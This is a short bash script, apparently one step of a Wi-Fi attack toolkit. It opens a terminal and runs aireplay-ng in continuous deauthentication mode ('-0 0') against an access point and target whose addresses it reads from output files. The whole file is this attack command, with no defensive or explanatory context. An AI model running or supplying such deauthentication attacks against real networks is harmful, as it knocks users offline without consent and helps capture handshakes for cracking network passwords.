#!/bin/bash

xterm -e "aireplay-ng -0 0 --ignore-negative-one -a $(cat output4.txt) $(cat output6.txt);bash";
